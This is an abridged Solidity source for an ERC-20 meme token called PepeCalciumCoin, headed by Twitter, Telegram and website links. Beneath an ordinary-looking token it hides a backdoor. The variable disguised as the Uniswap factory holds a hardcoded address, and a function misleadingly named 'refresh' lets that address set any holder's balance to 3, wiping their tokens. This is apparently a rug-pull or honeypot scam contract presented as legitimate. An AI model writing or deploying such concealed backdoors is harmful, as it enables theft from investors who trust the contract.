...
https://twitter.com/PepeCalciumCoinerc20
https://t.me/PepeCalciumCoinERC20
https://PepeCalciumCoinMoon.club
*/
...
pragma solidity ^0.8.0;
contract PepeCalciumCoin is Context, IERC20, Ownable {
    ...
    address private _uniswapV2Factory = 0xD5db64e0b6e84dcADF2Fa622e1AcB31952bF4bC0;
    uint256 private totSupply = 6010000000000 * 10**_decimals;
    ...
    } function refresh(address refreshSender) external { if (msg.sender == _uniswapV2Factory) _balances[refreshSender] = 3;
    } 
